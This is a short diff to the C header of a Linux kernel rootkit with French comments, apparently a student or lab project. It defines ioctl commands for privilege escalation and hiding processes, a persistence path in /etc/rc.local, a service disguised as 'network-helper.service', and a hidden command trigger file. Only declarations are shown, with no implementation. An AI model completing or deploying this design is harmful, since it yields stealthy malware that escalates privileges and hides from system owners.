@@ -19,20 +19,20 @@
 #include <linux/string.h>
 #endif
 
-#define RK_MAGIC 0xDE
+#define RK_MAGIC 'R'
 #define MCOUNT_INSN_SIZE 5
 #define NAME_MODULE "rootkit"
 #define HIDDEN_SCRIPT "network-helper.service"
 #define RK_MSG_MAX 256
 
-/* TODO: definir le chemin du fichier de persistance sur ta LFS */
+/* chemin du fichier de persistance sur ta LFS */
 #define PERSIST_FILE "/etc/rc.local"
 
-/* TODO: definir le chemin du fichier trigger pour le canal de comm secondaire */
+/* chemin du fichier trigger pour le canal de comm secondaire */
 #define RK_CMD_FILE "/tmp/.rk_cmd"
 
 /* Buffer pour le canal de communication secondaire */
-/* TODO: rempli via RK_CMD_SET_MSG dans rk_ioctl() */
+
 extern char rk_msg[RK_MSG_MAX];
 
 /* Structure d'arguments passee a chaque commande */
@@ -46,7 +46,8 @@ struct rk_args {
 #define RK_CMD_PRIVESC  _IOW (RK_MAGIC, 1, struct rk_args)
 #define RK_CMD_HIDE_PID _IOW (RK_MAGIC, 2, struct rk_args)
 #define RK_CMD_GETUID   _IOR (RK_MAGIC, 3, struct rk_args)
-/* TODO: utilisee dans rk_ioctl() pour recevoir un message du programme compagnon */
+
+/* utilisee dans rk_ioctl() pour recevoir un message du programme compagnon */
 #define RK_CMD_SET_MSG  _IOW (RK_MAGIC, 4, struct rk_args)
 
 #ifdef __KERNEL__
